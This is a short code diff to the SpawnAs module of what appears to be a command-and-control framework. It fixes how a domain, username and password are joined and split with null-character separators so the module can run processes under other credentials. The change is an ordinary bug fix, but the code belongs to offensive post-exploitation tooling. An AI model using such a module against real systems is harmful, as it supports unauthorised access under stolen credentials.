@@ -81,9 +81,9 @@ int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
         }
 
         std::string cmd = domain;
-        cmd += "\0";
+        cmd += '\0';
         cmd += username;
-        cmd += "\0";
+        cmd += '\0';
         cmd += password;
 
 
@@ -115,7 +115,9 @@ int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
     const std::string payload = c2Message.data();
 
     std::vector<std::string> splitedList;
-    splitList(cmd, "\0", splitedList);
+    std::string delimitator;
+    delimitator+='\0';
+    splitList(cmd, delimitator, splitedList);
 
     std::string domain=splitedList[0];
     std::string username=splitedList[1];
